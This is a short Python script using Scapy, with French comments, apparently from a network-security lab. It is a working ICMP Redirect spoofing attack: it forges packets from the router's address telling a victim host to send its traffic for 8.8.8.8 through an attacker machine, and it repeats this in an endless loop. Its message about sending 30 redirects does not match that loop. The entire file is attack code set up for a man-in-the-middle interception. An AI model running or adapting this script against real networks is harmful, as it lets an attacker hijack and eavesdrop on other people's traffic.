from scapy.all import *
import time

victim_ip = "10.53.79.51"     # Host A
attacker_ip = "10.53.79.220"  #ATTAQUANT
router_ip = "10.53.79.1"
target_dest = "8.8.8.8"

print("Envoi de 30 ICMP Redirects...\n")
while(True):
    ip = IP(src=router_ip, dst=victim_ip, ttl=255)
    icmp = ICMP(type=5, code=1)
    icmp.gw = attacker_ip
    ip2 = IP(src=victim_ip, dst=target_dest, ttl=64)
    
    pkt = ip/icmp/ip2/ICMP(type=8)
    send(pkt, verbose=0)
    time.sleep(0.3)